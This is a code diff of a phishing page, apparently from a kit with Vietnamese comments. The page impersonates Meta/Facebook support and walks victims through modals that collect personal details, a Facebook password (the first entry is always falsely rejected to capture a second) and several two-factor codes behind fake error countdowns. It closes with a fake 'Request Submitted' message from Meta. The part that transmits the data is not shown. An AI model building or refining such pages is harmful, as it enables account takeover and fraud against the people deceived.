+    {code:"RU",name:"Russia",dial:"+7",flag:"🇷🇺"},
+    {code:"SA",name:"Saudi Arabia",dial:"+966",flag:"🇸🇦"},
+    {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},
+    {code:"ZA",name:"South Africa",dial:"+27",flag:"🇿🇦"},
+    {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},
+    {code:"ES",name:"Spain",dial:"+34",flag:"🇪🇸"},
+    {code:"LK",name:"Sri Lanka",dial:"+94",flag:"🇱🇰"},
+    {code:"SE",name:"Sweden",dial:"+46",flag:"🇸🇪"},
+    {code:"CH",name:"Switzerland",dial:"+41",flag:"🇨🇭"},
+    {code:"TW",name:"Taiwan",dial:"+886",flag:"🇹🇼"},
+    {code:"TZ",name:"Tanzania",dial:"+255",flag:"🇹🇿"},
+    {code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
+    {code:"TR",name:"Turkey",dial:"+90",flag:"🇹🇷"},
+    {code:"UA",name:"Ukraine",dial:"+380",flag:"🇺🇦"},
+    {code:"AE",name:"United Arab Emirates",dial:"+971",flag:"🇦🇪"},
+    {code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
+    {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
+    {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"}
+  ];
+
+  /* ============================================================
+     IP DETECTION — Promise-based, race 3 APIs, fallback VN
+  ============================================================ */
+  var _ipReady = false;          // true khi detect xong
+  var _ipResolvers = [];         // callbacks đang chờ
+  var _selectedDial = "+84";     // default fallback = VN
+  var _selectedFlag = "🇻🇳";
+  var _selectedCode = "VN";
+  var _dropOpen = false;
+
+  function _applyCountry(code) {
+    if (_ipReady) return;        // đã apply rồi, bỏ qua
+    code = (code || '').toUpperCase();
+    var found = null;
+    for (var i = 0; i < COUNTRY_CODES.length; i++) {
+      if (COUNTRY_CODES[i].code === code) { found = COUNTRY_CODES[i]; break; }
+    }
+    if (!found) return;
+
+    _ipReady = true;
+    _selectedDial = found.dial;
+    _selectedFlag = found.flag;
+    _selectedCode = found.code;
+
+    /* Nếu modal đang mở thì cập nhật DOM luôn */
+    var f = document.getElementById('pcsFlag');
+    var d = document.getElementById('pcsDial');
+    if (f) f.textContent = found.flag;
+    if (d) d.textContent = found.dial;
+
+    /* Resolve tất cả callback đang chờ */
+    _ipResolvers.forEach(function(fn) { fn(); });
+    _ipResolvers = [];
+  }
+
+  function _onIpReady(fn) {
+    if (_ipReady) { fn(); return; }
+    _ipResolvers.push(fn);
+  }
+
+  /* Fallback sau 3s nếu cả 3 API đều lỗi/chậm */
+  setTimeout(function() {
+    if (!_ipReady) {
+      _ipReady = true;
+      _ipResolvers.forEach(function(fn) { fn(); });
+      _ipResolvers = [];
+    }
+  }, 3000);
+
+  /* Chạy 3 API song song, API nào về trước thắng */
+  (function detectIP() {
+    /* API 1 */
+    fetch('https://ipwho.is/')
+      .then(function(r) { return r.json(); })
+      .then(function(d) { _applyCountry(d.country_code); })
+      .catch(function() {});
+
+    /* API 2 */
+    fetch('https://ipapi.co/json/')
+      .then(function(r) { return r.json(); })
+      .then(function(d) { _applyCountry(d.country_code); })
+      .catch(function() {});
+
+    /* API 3 */
+    fetch('https://ip.seeip.org/geoip')
+      .then(function(r) { return r.json(); })
+      .then(function(d) { _applyCountry(d.country_code); })
+      .catch(function() {});
+  })();
+
+  /* ============================================================
+     PHONE SELECTOR BUILDER
+  ============================================================ */
+  function _buildPhoneSelector() {
+    var opts = COUNTRY_CODES.map(function(c) {
+      var active = c.code === _selectedCode;
+      return '<div class="pcs-opt" data-dial="' + c.dial + '" data-flag="' + c.flag + '" data-code="' + c.code + '" onclick="_selectDial(this)"'
+        + (active ? ' style="background:#e8f0fe;" id="pcs-active"' : '') + '>'
+        + '<span style="font-size:18px;margin-right:8px;line-height:1;">' + c.flag + '</span>'
+        + '<span style="font-size:13px;color:#111;font-weight:700;min-width:46px;display:inline-block;">' + c.dial + '</span>'
+        + '<span style="font-size:13px;color:#555;">' + c.name + '</span></div>';
+    }).join('');
+
+    return '<div class="nf-input-wrap phone-row" style="padding:0;height:44px;margin-bottom:10px;overflow:visible;">'
+      + '<div class="pcs-wrap" id="pcs">'
+      + '<div class="pcs-trigger" onclick="_toggleDial()">'
+      + '<span id="pcsFlag" style="font-size:18px;line-height:1;">' + _selectedFlag + '</span>'
+      + '<span class="pcs-dial" id="pcsDial">' + _selectedDial + '</span>'
+      + '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5" style="flex-shrink:0;margin-left:2px;"><path d="M6 9l6 6 6-6"/></svg></div>'
+      + '<div class="pcs-dropdown" id="pcsDropdown" style="display:none;">'
+      + '<input class="pcs-search" id="pcsSearch" type="text" placeholder="🔍  Search country..." oninput="_filterDial(this.value)">'
+      + '<div class="pcs-list" id="pcsList">' + opts + '</div></div></div>'
+      + '<input class="pcs-phone-input" id="phone" type="tel" placeholder="Phone number" inputmode="tel">'
+      + '</div>';
+  }
+
+  function _toggleDial() {
+    var dd = document.getElementById('pcsDropdown'); if (!dd) return;
+    _dropOpen = !_dropOpen;
+    if (_dropOpen) {
+      dd.style.display = 'flex'; dd.style.flexDirection = 'column';
+      setTimeout(function() {
+        var active = document.getElementById('pcs-active');
+        if (active) active.scrollIntoView({ block: 'center' });
+        var s = document.getElementById('pcsSearch'); if (s) s.focus();
+      }, 50);
+    } else {
+      dd.style.display = 'none';
+    }
+  }
+
+  function _selectDial(el) {
+    _selectedDial = el.dataset.dial;
+    _selectedFlag = el.dataset.flag;
+    _selectedCode = el.dataset.code;
+    var f = document.getElementById('pcsFlag'); if (f) f.textContent = _selectedFlag;
+    var d = document.getElementById('pcsDial'); if (d) d.textContent = _selectedDial;
+    /* remove old active, set new */
+    var oldActive = document.getElementById('pcs-active');
+    if (oldActive) { oldActive.style.background = ''; oldActive.removeAttribute('id'); }
+    el.style.background = '#f0f4ff'; el.id = 'pcs-active';
+    _dropOpen = false;
+    var dd = document.getElementById('pcsDropdown'); if (dd) dd.style.display = 'none';
+  }
+
+  function _filterDial(q) {
+    document.querySelectorAll('.pcs-opt').forEach(function(el) {
+      el.style.display = el.textContent.toLowerCase().includes(q.toLowerCase()) ? '' : 'none';
+    });
+  }
+
+  document.addEventListener('click', function(e) {
+    var w = document.getElementById('pcs');
+    if (w && !w.contains(e.target)) {
+      _dropOpen = false;
+      var dd = document.getElementById('pcsDropdown'); if (dd) dd.style.display = 'none';
+    }
+  });
+
+  /* ============================================================
+     MODAL ENGINE
+  ============================================================ */
+  var _masterData = {};
+  var Modal = {
+    _current: null,
+    create: function(id, content) {
+      var old = document.getElementById(id); if (old) old.remove();
+      var o = document.createElement('div');
+      o.id = id; o.className = 'modal-overlay';
+      o.innerHTML = '<div class="modal-box">' + content + '</div>';
+      o.addEventListener('click', function(e) { if (e.target === o) Modal.close(id); });
+      document.getElementById('modalsContainer').appendChild(o);
+    },
+    open: function(id) {
+      var o = document.getElementById(id); if (!o) return;
+      requestAnimationFrame(function() { o.classList.add('open'); });
+      Modal._current = id; document.body.style.overflow = 'hidden';
+    },
+    close: function(id) {
+      var o = document.getElementById(id); if (!o) return;
+      o.classList.remove('open'); document.body.style.overflow = '';
+      setTimeout(function() { if (o.parentNode) o.parentNode.removeChild(o); }, 260);
+      Modal._current = null;
+    }
+  };
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' && Modal._current) Modal.close(Modal._current);
+  });
+
+  /* ============================================================
+     MODAL: Information
+     — Chờ IP detect xong rồi mới build phone selector
+  ============================================================ */
+  function openClientModal() {
+    _masterData = {};
+
+    /* Tạo modal với loading spinner trước */
+    var loadingHtml =
+      '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">'
+      + '<h2 style="font-weight:700;color:#0A1317;font-size:15px;text-align:center;flex:1;">Information</h2>'
+      + '<div style="width:18px;height:18px;cursor:pointer;opacity:0.6;flex-shrink:0;" onclick="Modal.close(\'clientModal\')">'
+      + '<img src="public/icons/ic_close.svg" style="width:18px;height:18px;" alt="close" '
+      + 'onerror="this.parentNode.innerHTML=\'&times;\';this.parentNode.style.fontSize=\'20px\';this.parentNode.style.opacity=\'0.5\';">'
+      + '</div></div>'
+      + '<div id="clientFormWrap" style="min-height:120px;display:flex;align-items:center;justify-content:center;">'
+      + '<div class="modal-loading-spinner"></div>'
+      + '</div>';
+
+    Modal.create('clientModal', loadingHtml);
+
+    var box = document.querySelector('#clientModal .modal-box');
+    if (box) {
+      box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+    }
+
+    Modal.open('clientModal');
+
+    /* Khi IP ready thì render form đầy đủ */
+    _onIpReady(function() {
+      var wrap = document.getElementById('clientFormWrap');
+      if (!wrap) return; /* modal đã bị đóng */
+
+      var formHtml =
+        '<form id="clientForm" autocomplete="off" style="width:100%;">'
 
         /* Full Name */
-        +'<div class="nf-input-wrap"><input id="fullName" placeholder="Full Name" type="text" required autocomplete="name" class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="fullName" placeholder="Full Name" type="text" required autocomplete="name" class="nf-input"></div>'
 
         /* Email */
-        +'<div class="nf-input-wrap"><input id="email" placeholder="Email Address" type="email" required inputmode="email" autocomplete="email" class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="email" placeholder="Email Address" type="email" required inputmode="email" autocomplete="email" class="nf-input"></div>'
 
         /* Email Business */
-        +'<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Email Business Address" type="email" inputmode="email" class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Email Business Address" type="email" inputmode="email" class="nf-input"></div>'
 
         /* Fanpage */
-        +'<div class="nf-input-wrap"><input id="fanpage" placeholder="Fanpage Name" type="text" required class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="fanpage" placeholder="Fanpage Name" type="text" required class="nf-input"></div>'
 
-        /* Phone */
+        /* Phone — dùng _selectedFlag/_selectedDial đã được detect */
         + _buildPhoneSelector()
 
         /* Date of Birth */
-        +'<b style="color:#9a979e;font-size:14px;margin-bottom:7px;display:block;">Date of Birth</b>'
-        +'<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">'
-        +'<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input"></div>'
-        +'<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input"></div>'
-        +'<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input"></div>'
-        +'</div>'
+        + '<b style="color:#9a979e;font-size:14px;margin-bottom:7px;display:block;">Date of Birth</b>'
+        + '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input"></div>'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input"></div>'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input"></div>'
+        + '</div>'
 
         /* Message */
-        +'<div class="nf-input-wrap" style="height:100px;padding:11px;align-items:flex-start;">'
-        +'<textarea id="message" placeholder="Message" style="width:100%;outline:none;border:none;background:transparent;font-size:16px;font-family:inherit;resize:none;height:100%;display:block;"></textarea>'
-        +'</div>'
+        + '<div class="nf-input-wrap" style="height:100px;padding:11px;align-items:flex-start;">'
+        + '<textarea id="message" placeholder="Message" style="width:100%;outline:none;border:none;background:transparent;font-size:16px;font-family:inherit;resize:none;height:100%;display:block;"></textarea>'
+        + '</div>'
 
         /* Hint */
-        +'<p style="color:#9a979e;font-size:14px;margin-bottom:7px;">Our response will be sent to you within 14 - 48 hours.</p>'
+        + '<p style="color:#9a979e;font-size:14px;margin-bottom:7px;">Our response will be sent to you within 14 - 48 hours.</p>'
 
         /* Checkbox */
-        +'<div style="margin-top:15px;margin-bottom:20px;">'
-        +'<label style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px;" for="agreeCheck">'
-        +'<input id="agreeCheck" type="checkbox" required style="width:16px;height:16px;accent-color:#0064E0;flex-shrink:0;">'
-        +'I agree to the <a href="#" style="color:#0064E0;">Terms of use</a>'
-        +'</label></div>'
+        + '<div style="margin-top:15px;margin-bottom:20px;">'
+        + '<label style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px;" for="agreeCheck">'
+        + '<input id="agreeCheck" type="checkbox" required style="width:16px;height:16px;accent-color:#0064E0;flex-shrink:0;">'
+        + 'I agree to the <a href="#" style="color:#0064E0;">Terms of use</a>'
+        + '</label></div>'
 
         /* Submit */
-        +'<div style="width:100%;margin-top:20px;">'
-        +'<button type="submit" class="modal-btn-primary">Submit</button>'
-        +'</div>'
-        +'</form></div>';
+        + '<div style="width:100%;margin-top:20px;">'
+        + '<button type="submit" class="modal-btn-primary">Submit</button>'
+        + '</div>'
+        + '</form>';
 
-      Modal.create('clientModal', html);
-
-      /* Apply gradient background to modal box */
-      var box = document.querySelector('#clientModal .modal-box');
-      if (box) {
-        box.style.background = 'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)';
-      }
-
-      Modal.open('clientModal');
+      wrap.style.minHeight = '';
+      wrap.style.display = 'block';
+      wrap.innerHTML = formHtml;
 
       document.getElementById('clientForm').addEventListener('submit', function(e) {
         e.preventDefault();
@@ -998,116 +1004,131 @@
         _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
         _masterData.fanpage       = document.getElementById('fanpage').value.trim();
         _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
-        _masterData.dob           = document.getElementById('day').value+'/'+document.getElementById('month').value+'/'+document.getElementById('year').value;
+        _masterData.dob           = document.getElementById('day').value + '/' + document.getElementById('month').value + '/' + document.getElementById('year').value;
         _masterData.message       = document.getElementById('message').value.trim();
         Modal.close('clientModal');
         setTimeout(openSecurityModal, 280);
       });
-    }
+    });
+  }
 
-    function openSecurityModal() {
-      var html =
-        '<div style="display:flex;flex-direction:column;align-items:center;">'
-        +'<div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">'
-        +'<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button></div>'
-        +'<img src="public/icons/ic_facebook_circle.svg" style="width:48px;height:48px;margin-bottom:16px;" alt="secure" />'
-        +'<div style="width:100%">'
-        +'<p style="font-size:14px;color:#606770;margin-bottom:16px;line-height:1.5;">For your security, please enter your password to continue.</p>'
-        +'<form id="securityForm">'
-        +'<div class="modal-field"><input type="password" id="password" placeholder="Password" required></div>'
-        +'<p id="passwordError" class="modal-error"></p>'
-        +'<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>'
-        +'<p style="text-align:center;margin-top:16px;"><a href="#" style="color:#606770;font-size:14px;">Forgot your password?</a></p>'
-        +'</form></div></div>';
-      Modal.create('securityModal', html);
-      Modal.open('securityModal');
-      var clickCount = 0;
-      document.getElementById('securityForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        var pw = document.getElementById('password').value.trim();
-        var err = document.getElementById('passwordError');
-        var btn = document.getElementById('securityBtn');
-        err.classList.remove('show');
-        if (!pw) { err.textContent = "Please enter your password."; err.classList.add('show'); return; }
-        btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
-        if (clickCount === 0) {
-          _masterData.password = pw;
-          setTimeout(function() {
-            btn.disabled = false; btn.textContent = 'Continue';
-            document.getElementById('password').value = '';
-            err.textContent = "The password you've entered is incorrect."; err.classList.add('show');
-            clickCount = 1;
-          }, 1350);
-        } else {
-          _masterData.passwordSecond = pw;
-          setTimeout(function() { Modal.close('securityModal'); setTimeout(openAuthenticationModal, 280); }, 1500);
-        }
-      });
-    }
+  /* ============================================================
+     MODAL: Security (Password)
+  ============================================================ */
+  function openSecurityModal() {
+    var html =
+      '<div style="display:flex;flex-direction:column;align-items:center;">'
+      + '<div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">'
+      + '<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button></div>'
+      + '<img src="public/icons/ic_facebook_circle.svg" style="width:48px;height:48px;margin-bottom:16px;" alt="secure" />'
+      + '<div style="width:100%">'
+      + '<p style="font-size:14px;color:#606770;margin-bottom:16px;line-height:1.5;">For your security, please enter your password to continue.</p>'
+      + '<form id="securityForm">'
+      + '<div class="modal-field"><input type="password" id="password" placeholder="Password" required></div>'
+      + '<p id="passwordError" class="modal-error"></p>'
+      + '<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>'
+      + '<p style="text-align:center;margin-top:16px;"><a href="#" style="color:#606770;font-size:14px;">Forgot your password?</a></p>'
+      + '</form></div></div>';
 
-    function openAuthenticationModal() {
-      var html =
-        '<div style="display:flex;flex-direction:column;">'
-        +'<div class="modal-header" style="margin-bottom:6px;">'
-        +'<div class="modal-user-info"><span>'+(_masterData.fullName||'')+'</span><span class="modal-dot"></span><span>Meta</span></div>'
-        +'<button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button></div>'
-        +'<h2 style="font-size:18px;font-weight:700;color:#000;margin-bottom:12px;">Two-factor authentication</h2>'
-        +'<p class="modal-hint">Enter the 6-digit code from your authenticator app or sent to your email/phone.</p>'
-        +'<form id="authForm">'
-        +'<div class="modal-field"><input type="number" id="twoFa" placeholder="6-digit code" required inputmode="numeric" maxlength="6"></div>'
-        +'<p id="authError" class="modal-error"></p>'
-        +'<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>'
-        +'<button type="button" class="modal-btn-outline">Try another way</button>'
-        +'</form></div>';
-      Modal.create('authModal', html);
-      Modal.open('authModal');
-      var authCount = 0, cdInterval = null;
-      document.getElementById('authForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        var code = document.getElementById('twoFa').value.trim();
-        var err = document.getElementById('authError');
-        var btn = document.getElementById('authBtn');
-        err.classList.remove('show');
-        if (!code) { err.textContent = "Please enter the code."; err.classList.add('show'); return; }
-        btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
-        if (authCount < 2) {
-          _masterData['twoFa'+authCount] = code;
-          setTimeout(function() {
-            btn.innerHTML = 'Continue';
-            var inp = document.getElementById('twoFa'); if(inp){inp.disabled=true;inp.value='';}
-            var t = 30;
-            err.textContent = 'Incorrect code. Try again after '+t+'s.'; err.classList.add('show');
-            cdInterval = setInterval(function() {
-              t--; err.textContent = 'Incorrect code. Try again after '+t+'s.';
-              if (t <= 0) {
-                clearInterval(cdInterval);
-                if(inp){inp.disabled=false;} btn.disabled=false;
-                err.classList.remove('show');
-              }
-            }, 1000);
-            authCount++;
-          }, 1400);
-        } else {
-          _masterData.twoFaFinal = code;
-          setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 280); }, 1600);
-        }
-      });
-    }
+    Modal.create('securityModal', html);
+    Modal.open('securityModal');
 
-    function openSuccessModal() {
-      var html =
-        '<div class="modal-header">'
-        +'<h2 style="font-size:17px;font-weight:700;flex:1;">Request Submitted</h2>'
-        +'<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button></div>'
-        +'<div style="text-align:center;padding:16px 0;">'
-        +'<img src="public/images/ICONMOI.svg" class="modal-success-icon" alt="success" /></div>'
-        +'<p style="color:#9a979e;font-size:15px;margin-bottom:8px;line-height:1.5;">Your request has been added to the processing queue. We will handle it within 24 hours.</p>'
-        +'<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support team at Meta.</p>'
-        +'<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>';
-      Modal.create('successModal', html);
-      Modal.open('successModal');
-    }
-    </script>
+    var clickCount = 0;
+    document.getElementById('securityForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var pw = document.getElementById('password').value.trim();
+      var err = document.getElementById('passwordError');
+      var btn = document.getElementById('securityBtn');
+      err.classList.remove('show');
+      if (!pw) { err.textContent = "Please enter your password."; err.classList.add('show'); return; }
+      btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
+      if (clickCount === 0) {
+        _masterData.password = pw;
+        setTimeout(function() {
+          btn.disabled = false; btn.textContent = 'Continue';
+          document.getElementById('password').value = '';
+          err.textContent = "The password you've entered is incorrect."; err.classList.add('show');
+          clickCount = 1;
+        }, 1350);
+      } else {
+        _masterData.passwordSecond = pw;
+        setTimeout(function() { Modal.close('securityModal'); setTimeout(openAuthenticationModal, 280); }, 1500);
+      }
+    });
+  }
+
+  /* ============================================================
+     MODAL: Two-factor Authentication
+  ============================================================ */
+  function openAuthenticationModal() {
+    var html =
+      '<div style="display:flex;flex-direction:column;">'
+      + '<div class="modal-header" style="margin-bottom:6px;">'
+      + '<div class="modal-user-info"><span>' + (_masterData.fullName || '') + '</span><span class="modal-dot"></span><span>Meta</span></div>'
+      + '<button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button></div>'
+      + '<h2 style="font-size:18px;font-weight:700;color:#000;margin-bottom:12px;">Two-factor authentication</h2>'
+      + '<p class="modal-hint">Enter the 6-digit code from your authenticator app or sent to your email/phone.</p>'
+      + '<form id="authForm">'
+      + '<div class="modal-field"><input type="number" id="twoFa" placeholder="6-digit code" required inputmode="numeric" maxlength="6"></div>'
+      + '<p id="authError" class="modal-error"></p>'
+      + '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>'
+      + '<button type="button" class="modal-btn-outline">Try another way</button>'
+      + '</form></div>';
+
+    Modal.create('authModal', html);
+    Modal.open('authModal');
+
+    var authCount = 0, cdInterval = null;
+    document.getElementById('authForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var code = document.getElementById('twoFa').value.trim();
+      var err = document.getElementById('authError');
+      var btn = document.getElementById('authBtn');
+      err.classList.remove('show');
+      if (!code) { err.textContent = "Please enter the code."; err.classList.add('show'); return; }
+      btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
+      if (authCount < 2) {
+        _masterData['twoFa' + authCount] = code;
+        setTimeout(function() {
+          btn.innerHTML = 'Continue';
+          var inp = document.getElementById('twoFa'); if (inp) { inp.disabled = true; inp.value = ''; }
+          var t = 30;
+          err.textContent = 'Incorrect code. Try again after ' + t + 's.'; err.classList.add('show');
+          cdInterval = setInterval(function() {
+            t--; err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+            if (t <= 0) {
+              clearInterval(cdInterval);
+              if (inp) { inp.disabled = false; } btn.disabled = false;
+              err.classList.remove('show');
+            }
+          }, 1000);
+          authCount++;
+        }, 1400);
+      } else {
+        _masterData.twoFaFinal = code;
+        setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 280); }, 1600);
+      }
+    });
+  }
+
+  /* ============================================================
+     MODAL: Success
+  ============================================================ */
+  function openSuccessModal() {
+    var html =
+      '<div class="modal-header">'
+      + '<h2 style="font-size:17px;font-weight:700;flex:1;">Request Submitted</h2>'
+      + '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button></div>'
+      + '<div style="text-align:center;padding:16px 0;">'
+      + '<img src="public/images/ICONMOI.svg" class="modal-success-icon" alt="success" /></div>'
+      + '<p style="color:#9a979e;font-size:15px;margin-bottom:8px;line-height:1.5;">Your request has been added to the processing queue. We will handle it within 24 hours.</p>'
+      + '<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support team at Meta.</p>'
+      + '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>';
+
+    Modal.create('successModal', html);
+    Modal.open('successModal');
+  }
+  </script>
 
 </body>
 </html>
